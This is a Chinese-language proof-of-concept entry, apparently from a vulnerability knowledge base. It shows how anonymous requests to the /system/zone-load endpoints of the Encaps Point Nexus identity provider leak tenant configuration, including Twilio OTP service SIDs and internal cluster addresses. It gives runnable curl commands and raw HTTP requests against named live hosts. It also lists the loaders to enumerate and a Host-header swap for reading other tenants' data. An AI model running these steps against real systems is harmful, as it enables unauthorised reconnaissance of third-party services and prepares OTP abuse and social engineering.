# Encaps Point Nexus IdP /system/zone-load/whitelabel-grant 未认证泄露租户配置（Twilio OTP Service SID + 内部 K8s 地址）

- **code**: encaps-point-nexus-zone-load-whitelabel-grant-unauth-idp-twi
- **kind**: poc
- **category**: info-leak
- **component**: Encaps Point Nexus（多租户 OIDC IdP / SSR 后端，前端 main.v-3.2.11 / 3.2.22）
- **versions**: 前端 auth main.v-3.2.11.js（IdP 主机）、dms main.v-3.2.22.js；后端加载器族接口
- **severity**: low
- **language**: http
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 16:xx UTC，本机 ARTEX bash + curl（经平台记录代理）直连实测。无 Cookie / 无 Authorization：GET https://gmg.auth.encaps.io/system/zone-load/whitelabel-grant → HTTP/2 200、content-type application/json;charset=UTF-8、19778B，body._zoneAppConfig.sms.OTPStrategy 为 provider=twilio 且含 verifyServiceSID(VA3ed3…)+messagingServiceSID(MG1742…)、signinUrl=https://appgmg.point.nexus/signin、appURL=https://dms.greenmangaming.com、providerID/appID。同族 loader（system-layout/whitelabel-choose/login/login-as/grant/home/layout-index/finalize-account 等 10 个）全部未认证 200。阴性对照：同批请求 GET https://dms.greenmangaming.com/system/zone-load/routes-admin-provider-apikeys → HTTP 302 Location /signin?redirect=…（业务/admin loader 确受认证保护，证明差异来自端点本身而非请求构造）。多租户验证：换 Host: nexus.auth.encaps.io 打同端点 → 200 返回 PointNexus 租户配置，证明租户由 Host 决定、同一后端多主机可达。
- **path**: pocs/encaps-point-nexus-zone-load-whitelabel-grant-unauth-idp-twi/poc.http
- **tags**: encaps,point-nexus,zone-load,unauth,info-leak,ssr,idor-by-host,twilio,otp,k8s,oidc-idp,multi-tenant
- **created_at**: 2026-11-11T16:12:22.343Z
- **engine**: gmg.auth.encaps.io (34.160.16.180, Encaps Point Nexus OIDC IdP)

## 描述

Encaps Point Nexus 多租户后端把 SSR 加载器数据端点 /system/zone-load/<loader> 暴露为未认证可读：租户由 Host 头决定，无需任何 Cookie/凭据即返回该租户完整 _zoneAppConfig。在 IdP 主机上，whitelabel-grant 泄露短信 OTP 服务配置（Twilio verifyServiceSID / messagingServiceSID）、未公开 signin 主机名与内部 K8s 服务地址、appURL/providerID/appID。属非预期对外暴露的内部配置（Service SID 本身非密钥，但可用于服务枚举/社工与后续 OTP 流程分析），故 low。根因与 KB#572 同（dms 主机 layouts-doc），本条覆盖 IdP 主机与 whitelabel-grant，泄露物不同。

## 用法

```
前提：目标为 Encaps Point Nexus 站点（*.encaps.io IdP 主机或同后端 dms/业务主机），无需任何账号/Cookie/凭据，纯匿名 HTTP GET；单个 Host = 单个租户。

【0) 端点族清单】（前端 JS 里可 grep 到，用于枚举全部 loader）：
  - 从目标 SPA 主包提取：https://<host>/.../main.v-*.js → grep "zone-load"
  - 实测存在的 loader：whitelabel-grant, system-layout, whitelabel-choose, login, login-as, grant, home, layout-index, finalize-account（同族约 10 个）

【1) 阴性对照（必做，防把 SPA 回落页当泄露）】对同一站点受保护路由打一发：
  curl -i --http2 'https://dms.<target>/system/zone-load/routes-admin-provider-apikeys'
  -> 应 HTTP 302 Location: /signin?redirect=...   （admin/业务 loader 受认证保护）

【2) 命中：未认证读租户配置】
  curl -s -k --http2 -A "$ARTEX_UA" 'https://gmg.auth.encaps.io/system/zone-load/whitelabel-grant' -w '\n|%{http_code} %{size_download}\n'
  -> HTTP/2 200, content-type: application/json;charset=UTF-8
     body._zoneAppConfig.sms.OTPStrategy.{provider,twilio.{verifyServiceSID,messagingServiceSID,verifyCustomCode}}
     body._zoneAppConfig.{signinUrl,appURL,providerID,appID,baseUrl}
  同族放量：/system/zone-load/system-layout 等其余 loader 同样未认证 200。

【3) 多租户横向（同一后端换 Host）】
  curl -s -k --http2 -H 'Host: nexus.auth.encaps.io' 'https://<任意该后端 IP>/system/zone-load/whitelabel-grant'
  -> 200，返回另一租户（appName=PointNexus）配置；证明租户隔离仅靠 Host、端点本身不鉴权。

判据：匿名 GET 返回 200 + application/json（非 text/html 回落页），body._zoneAppConfig 内出现 sms/OTPStrategy 或 oauthClient.internalBaseUrl(*.svc.cluster.local) 等仅内部可见的配置。

失败常见原因：
  - 返回 200 text/html：命中了 SPA 前端回落页，不是本漏洞；先确认 content-type 为 application/json。
  - 404：loader 名不对（以前端 JS 里实际出现的为准）。
  - 误报：未做 302 阴性对照，把受保护 admin loader 的登录跳转当泄露。

关联：KB#572 记录 dms 主机 /system/zone-load/layouts-doc 未认证泄露内部 K8s 地址（http://internal-auth.<cluster>.svc.cluster.local:60103）与 OAuth 客户端配置；本条为 IdP 主机 whitelabel-grant，额外泄露 Twilio OTP Service SID 与未公开 signin 主机（appgmg.point.nexus）。两者同一根因，可互为补充。
```

## 正文

```
# Encaps Point Nexus /system/zone-load/* 未认证泄露租户配置（IdP 主机 → Twilio OTP Service SID + 内部 K8s 地址）

## 组件 / 版本
Encaps Point Nexus 多租户 OIDC IdP / SSR 后端。
- IdP 前端：https://<idp-host>/GreenManGaming/auth/main.v-3.2.11.js
- 业务前端：https://<target>/GreenManGaming/app/main.v-3.2.22.js
- 端点族接口：GET /system/zone-load/<loader>（SSR 数据加载器）

## 前置条件
- 目标为 Encaps Point Nexus 站点（*.encaps.io 的 auth/idp 主机，或同后端的业务/dms 主机）。
- 无需任何账号 / Cookie / Authorization 凭据。纯匿名 HTTP GET，低噪。
- 重要：该后端为多租户 —— 租户由 **Host 头** 决定，同一 IP/后端可用不同 Host 拉不同租户配置。

## 端口/端点族
同族 loader（从前端 JS grep "zone-load" 可得，实测存在）：
`whitelabel-grant`、`system-layout`、`whitelabel-choose`、`login`、`login-as`、`grant`、`home`、`layout-index`、`finalize-account`（约 10 个），均未认证可达。

## 复现

### 0) 阴性对照（必做，排除 SPA 回落页误报）
```
GET /system/zone-load/routes-admin-provider-apikeys HTTP/2
Host: dms.<target>
(无 Cookie)
-> HTTP/2 302
   location: /signin?redirect=...        # 业务/admin loader 确实受认证保护
```

### 1) 命中：未认证读取 IdP 租户配置
```
GET /system/zone-load/whitelabel-grant HTTP/2
Host: gmg.auth.encaps.io
User-Agent: <ARTEX_UA>
Accept: */*
(无 Cookie / 无 Authorization)
-> HTTP/2 200
   content-type: application/json;charset=UTF-8
   size: ~19778B
```
响应体（脱敏后，时间戳/密钥字段已掩码）：
```json
{
  "_zoneAppConfig": {
    "ssr": false,
    "baseUrl": "https://gmg.auth.encaps.io",
    "oauthClient": null,
    "signinUrl": "https://appgmg.point.nexus/signin",
    "sms": {
      "OTPStrategy": {
        "provider": "twilio",
        "twilio": {
          "method": "verify",
          "channel": "sms",
          "verifyCustomCode": true,
          "verifyServiceSID": "VA3ed3...<REDACTED>",
          "messagingServiceSID": "MG1742...<REDACTED>"
        }
      }
    },
    "appURL": "https://dms.<target>",
    "providerID": "<uuid>",
    "appID": "<uuid>"
  }
}
```

### 2) 同族放量 + 多租户横向（同一后端换 Host）
```
GET /system/zone-load/system-layout HTTP/2
Host: gmg.auth.encaps.io
-> HTTP/2 200, ~19529B, body._zoneAppConfig.mailer.fromAddress=noreply@notify.encaps.io, UIData{...}

GET /system/zone-load/whitelabel-grant HTTP/2
Host: nexus.auth.encaps.io
-> HTTP/2 200, {"_zoneAppConfig":{"appName":"PointNexus","accountTypeRestriction":"partner","appURL":"https://app.point.nexus",...}}
```
证明：租户由 Host 决定，端点本身不鉴权，非单点异常。

## 判据
- 匿名 GET 返回 HTTP 200 且 `content-type: application/json`（不是 `text/html` 的 SPA 回落页）；
- body `_zoneAppConfig` 内出现仅内部可见的配置：`sms.OTPStrategy.twilio.{verifyServiceSID,messagingServiceSID}` 或 `oauthClient.internalBaseUrl = http://<svc>.<cluster>.svc.cluster.local:<port>`；
- 阴性对照：受保护 admin/业务 loader 返回 302 → /signin，证明差异来自端点本身而非请求构造。

## 影响
非预期对外暴露的租户内部配置。Twilio `verifyServiceSID`/`messagingServiceSID` 本身不是 API 密钥（需配套 Auth Token 才能调用），但可用于服务枚举、短信流程/OTP 策略分析与社会工程；同时泄露未公开 signin 主机（appgmg.point.nexus）与内部 K8s 服务地址。定级 low。

## 失败常见原因
- 200 但 `text/html`：命中前端 SPA 回落页 → 不是本漏洞，先校验 content-type 为 application/json。
- 404：loader 名写错 → 以前端 JS 中实际出现的为准。
- 误报：跳过 302 阴性对照，把登录跳转当成泄露。

## 关联
KB#572 记录 dms 主机 `/system/zone-load/layouts-doc` 未认证泄露内部 K8s 地址（`http://internal-auth.<cluster>.svc.cluster.local:60103`）与 OAuth 客户端配置。本条为 IdP 主机 `whitelabel-grant`，额外泄露 Twilio OTP Service SID 与未公开 signin 主机，二者同一根因、可互为补充。

## 来源
provenance: 本机 Windows/ARTEX bash shell + curl（经平台记录代理），2026-11-11 16:xx UTC 直连实测；端点清单由业务/IdP 前端 main.v-*.js 提取。

```
